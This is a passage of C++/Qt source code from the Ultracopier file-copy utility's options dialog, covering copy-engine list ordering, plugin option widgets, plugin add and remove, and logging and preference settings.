        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
        OptionEngine::optionEngine->setOptionValue("SessionLoader","LoadAtSessionStarting",checked);
    }
}
#endif

void OptionDialog::on_CopyEngineList_itemSelectionChanged()
{
    if(ui->CopyEngineList->selectedItems().size()!=0 && ui->CopyEngineList->count()>1)
    {
        ui->toolButtonUp->setEnabled(true);
        ui->toolButtonDown->setEnabled(true);
    }
    else
    {
        ui->toolButtonUp->setEnabled(false);
        ui->toolButtonDown->setEnabled(false);
    }
}

void OptionDialog::on_toolButtonDown_clicked()
{
    QListWidgetItem *item=ui->CopyEngineList->selectedItems().first();
    int position=ui->CopyEngineList->row(item);
    if((position+1)<ui->CopyEngineList->count())
    {
        QString text=item->text();
        item->setSelected(false);
        delete item;
        ui->CopyEngineList->insertItem(position+1,text);
        ui->CopyEngineList->item(position+1)->setSelected(true);
        ignoreCopyEngineListEdition=true;
        OptionEngine::optionEngine->setOptionValue("CopyEngine","List",copyEngineStringList());
        ignoreCopyEngineListEdition=false;
    }
}

void OptionDialog::on_toolButtonUp_clicked()
{
    QListWidgetItem *item=ui->CopyEngineList->selectedItems().first();
    int position=ui->CopyEngineList->row(item);
    if(position>0)
    {
        QString text=item->text();
        item->setSelected(false);
        delete item;
        ui->CopyEngineList->insertItem(position-1,text);
        ui->CopyEngineList->item(position-1)->setSelected(true);
        ignoreCopyEngineListEdition=true;
        OptionEngine::optionEngine->setOptionValue("CopyEngine","List",copyEngineStringList());
        ignoreCopyEngineListEdition=false;
    }
}

QStringList OptionDialog::copyEngineStringList()
{
    QStringList newList;
    int index=0;
    while(index<ui->CopyEngineList->count())
    {
        newList << ui->CopyEngineList->item(index)->text();
        index++;
    }
    return newList;
}

void OptionDialog::newThemeOptions(QString name,QWidget* theNewOptionsWidget,bool isLoaded,bool havePlugin)
{
    Q_UNUSED(isLoaded);
    Q_UNUSED(havePlugin);
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("start: isLoaded: %1, havePlugin: %2, name: %3").arg(isLoaded).arg(havePlugin).arg(name));
    pluginOptionsWidget tempItem;
    tempItem.name=name;
    tempItem.item=NULL;
    tempItem.options=theNewOptionsWidget;
    tempItem.category=PluginType_Themes;
    pluginOptionsWidgetList << tempItem;
    if(theNewOptionsWidget!=NULL)
    {
        ui->stackedWidgetThemesOptions->addWidget(theNewOptionsWidget);
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"set the last page");
    }
    on_Ultracopier_current_theme_currentIndexChanged(ui->Ultracopier_current_theme->currentIndex());
}

void OptionDialog::addPluginOptionWidget(const PluginType &category,const QString &name,QWidget * options)
{
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("start: %1, category: %2").arg(name).arg(category));
    //prevent send the empty options
    if(options!=NULL)
    {
        index=0;
        loop_size=pluginOptionsWidgetList.size();
        while(index<loop_size)
        {
            if(pluginOptionsWidgetList.at(index).name==name)
            {
                ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"already found: "+name);
                return;
            }
            index++;
        }
        //add to real list
        pluginOptionsWidget temp;
        temp.name=name;
        temp.options=options;
        temp.item=new QTreeWidgetItem(QStringList() << name);
        temp.category=category;
        pluginOptionsWidgetList << temp;
        //add the specific options
        switch(category)
        {
        case PluginType_CopyEngine:
            ui->treeWidget->topLevelItem(2)->addChild(pluginOptionsWidgetList.at(index).item);
            ui->stackedOptionsCopyEngine->addWidget(options);
            break;
        case PluginType_Listener:
            ui->treeWidget->topLevelItem(3)->addChild(pluginOptionsWidgetList.at(index).item);
            ui->stackedOptionsListener->addWidget(options);
            break;
        case PluginType_PluginLoader:
            ui->treeWidget->topLevelItem(4)->addChild(pluginOptionsWidgetList.at(index).item);
            ui->stackedOptionsPluginLoader->addWidget(options);
            break;
        case PluginType_SessionLoader:
            ui->treeWidget->topLevelItem(5)->addChild(pluginOptionsWidgetList.at(index).item);
            ui->stackedOptionsSessionLoader->addWidget(options);
            break;
        default:
            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Critical,"Unable to parse this unknow type of plugin: "+name);
            return;
        }
    }
    //only for copy engine
    if(category==PluginType_CopyEngine)
    {
        //but can loaded by the previous options
        index=0;
        loop_size=ui->CopyEngineList->count();
        while(index<loop_size)
        {
            if(ui->CopyEngineList->item(index)->text()==name)
                break;
            index++;
        }
        if(index==loop_size)
            ui->CopyEngineList->addItems(QStringList() << name);
    }
}

void OptionDialog::on_pluginList_itemSelectionChanged()
{
    if(ui->pluginList->selectedItems().size()==0)
    {
        ui->pluginRemove->setEnabled(false);
        ui->pluginInformation->setEnabled(false);
    }
    else
    {
        treeWidgetItem=ui->pluginList->selectedItems().first();
        index=0;
        loop_size=pluginLink.size();
        while(index<loop_size)
        {
            if(pluginLink.at(index).item==treeWidgetItem)
            {
                ui->pluginRemove->setEnabled(pluginLink.at(index).isWritable);
                ui->pluginInformation->setEnabled(true);
                return;
            }
            index++;
        }
    }
}

void OptionDialog::on_pluginInformation_clicked()
{
    treeWidgetItem=ui->pluginList->selectedItems().first();
    index=0;
    loop_size=pluginLink.size();
    while(index<loop_size)
    {
        if(pluginLink.at(index).item==treeWidgetItem)
        {
            PluginsManager::pluginsManager->showInformation(pluginLink.at(index).path);
            return;
        }
        index++;
    }
}

#ifdef ULTRACOPIER_PLUGIN_IMPORT_SUPPORT
void OptionDialog::on_pluginRemove_clicked()
{
    treeWidgetItem=ui->pluginList->selectedItems().first();
    index=0;
    loop_size=pluginLink.size();
    while(index<loop_size)
    {
        if(pluginLink.at(index).item==treeWidgetItem)
        {
            PluginsManager::pluginsManager->removeThePluginSelected(pluginLink.at(index).path);
            return;
        }
        index++;
    }
}

void OptionDialog::on_pluginAdd_clicked()
{
    PluginsManager::pluginsManager->addPlugin(defaultImportBackend);
}
#endif

void OptionDialog::on_checkBox_Log_clicked()
{
    if(allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
        OptionEngine::optionEngine->setOptionValue("Write_log","enabled",ui->checkBox_Log->isChecked());
    }
    ui->lineEditLog_transfer_format->setEnabled(ui->checkBoxLog_transfer->isChecked() && ui->checkBox_Log->isChecked());
    ui->lineEditLog_error_format->setEnabled(ui->checkBoxLog_error->isChecked() && ui->checkBox_Log->isChecked());
    ui->lineEditLog_folder_format->setEnabled(ui->checkBoxLog_folder->isChecked() && ui->checkBox_Log->isChecked());
}

void OptionDialog::on_lineEditLog_File_editingFinished()
{
    if(allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
        OptionEngine::optionEngine->setOptionValue("Write_log","file",ui->lineEditLog_File->text());
    }
}

void OptionDialog::on_lineEditLog_transfer_format_editingFinished()
{
    if(allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
        OptionEngine::optionEngine->setOptionValue("Write_log","transfer_format",ui->lineEditLog_transfer_format->text());
    }
}

void OptionDialog::on_lineEditLog_error_format_editingFinished()
{
    if(allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
        OptionEngine::optionEngine->setOptionValue("Write_log","error_format",ui->lineEditLog_error_format->text());
    }
}

void OptionDialog::on_checkBoxLog_transfer_clicked()
{
    if(allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
        OptionEngine::optionEngine->setOptionValue("Write_log","transfer",ui->checkBoxLog_transfer->isChecked());
    }
}

void OptionDialog::on_checkBoxLog_error_clicked()
{
    if(allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
        OptionEngine::optionEngine->setOptionValue("Write_log","error",ui->checkBoxLog_error->isChecked());
    }
}

void OptionDialog::on_checkBoxLog_folder_clicked()
{
    if(allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
        OptionEngine::optionEngine->setOptionValue("Write_log","folder",ui->checkBoxLog_folder->isChecked());
    }
}

void OptionDialog::on_logBrowse_clicked()
{
    QString file=QFileDialog::getSaveFileName(this,tr("Save logs as: "),ResourcesManager::resourcesManager->getWritablePath());
    if(file!="")
    {
        ui->lineEditLog_File->setText(file);
        on_lineEditLog_File_editingFinished();
    }
}

void OptionDialog::on_checkBoxLog_sync_clicked()
{
    if(allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
        OptionEngine::optionEngine->setOptionValue("Write_log","sync",ui->checkBoxLog_sync->isChecked());
    }
}

void OptionDialog::on_ActionOnManualOpen_currentIndexChanged(int index)
{
    if(index!=-1 && allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"data value: "+ui->ActionOnManualOpen->itemData(index).toString()+", string value: "+ui->ActionOnManualOpen->itemText(index)+", index: "+QString::number(index));
        OptionEngine::optionEngine->setOptionValue("Ultracopier","ActionOnManualOpen",index);
    }
}

void OptionDialog::on_GroupWindowWhen_currentIndexChanged(int index)
{
    if(index!=-1 && allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"data value: "+ui->GroupWindowWhen->itemData(index).toString()+", string value: "+ui->GroupWindowWhen->itemText(index)+", index: "+QString::number(index));
        OptionEngine::optionEngine->setOptionValue("Ultracopier","GroupWindowWhen",index);
    }
}

void OptionDialog::on_DisplayOSWarning_clicked()
{
    if(allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
        OptionEngine::optionEngine->setOptionValue("Ultracopier","displayOSSpecific",ui->DisplayOSWarning->isChecked());
    }
}

void OptionDialog::newClientList(const QStringList &clientsList)
{
    ui->clientConnected->clear();
    ui->clientConnected->addItems(clientsList);
}

void OptionDialog::on_checkTheUpdate_clicked()
{
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
    OptionEngine::optionEngine->setOptionValue("Ultracopier","checkTheUpdate",ui->checkTheUpdate->isChecked());
}

void OptionDialog::on_confirmToGroupWindows_clicked()
{
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
    OptionEngine::optionEngine->setOptionValue("Ultracopier","confirmToGroupWindows",ui->confirmToGroupWindows->isChecked());
}

void OptionDialog::on_giveGPUTime_clicked()
{
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
    OptionEngine::optionEngine->setOptionValue("Ultracopier","giveGPUTime",ui->giveGPUTime->isChecked());
}
